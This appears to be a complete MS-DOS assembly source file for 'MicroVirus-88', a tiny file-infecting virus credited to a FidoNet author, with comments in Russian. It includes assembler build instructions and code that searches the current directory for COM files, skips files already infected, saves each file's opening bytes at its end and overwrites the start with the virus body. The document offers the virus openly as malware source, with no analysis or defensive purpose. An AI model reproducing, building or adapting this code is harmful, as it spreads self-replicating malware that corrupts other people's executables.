;MicroVirus-88
;method: infect all COM files in current directory

;4 compile it:
;tasm /m microvir.asm
;tlink /t microvir.obj

;(c) Psychomancer aka Nice,SPS (2:454/2.175@FidoNet)
;thx 4 2 bytes 2 Ilya Vasilyev (2:5020/287@FidoNet)

		model tiny
		.code

		.startup

		mov	ah,4eh				;найти первый файл
		mov	di,si				;SI=DI=100h
		add	si,0ff00h			;смещение буфера сохраненного куска
oldlen		equ	$-@startup-2
		lea	dx,findmask			;маска поиска
nextopen:	int	21h
		jc	exitprog			;если .COM файлов нет - выход
		mov	dx,9eh				;тут будет лежать имя файла
		mov	ax,3d92h	
		int	21h				;открыть файл для чтения\записи
		xchg	bx,ax				;в BX-описатель
		mov	dh,0feh				;адрес для буфера
		mov	ah,3fh
		call	read				;прочитать кусок из начала файла
		cmp	byte ptr ds:[0fe9eh],0		;уже инфицирован (первая команда MOV CL,??)?
		org	$-1
		mov	ah,0
		org	$-1
		je	closefile			;да - выйти
		mov	ax,4202h
		call	write				;переместить указатель в конец файла и
							;сохранить в конце начало файла
		mov	[di+oldlen],bp			;сохранить смещение сохраненного куска
		mov	dx,di				;DX=100h
		mov	ax,4200h
		call	write				;указатель в начало файла и
							;записать собственное тело
closefile:	mov	ah,3eh
		int	21h				;закрыть файл
		mov	ah,4fh				;найти следующий
		jmp	nextopen
exitprog:	push	di				;запихнуть в стек адрес возврата (100h)
		rep	movsb				;восстановить прогу в памяти
		retn					;запустить ее
							;(не сработает на пентиуме из-за конвейера)

write:		push	dx
		cwd					;DX=0
		mov	cx,dx				;CX=0
		int	21h				;переместить указатель в файле
		pop	dx
		xchg	bp,ax
		mov	ah,40h
read:		mov	cl,lenconst			;длина тела
		int	21h				;писать в файл
		retn

findmask	db	'*.cOm',0			;маска поиска файлов
lenconst	equ	$-@startup

		end
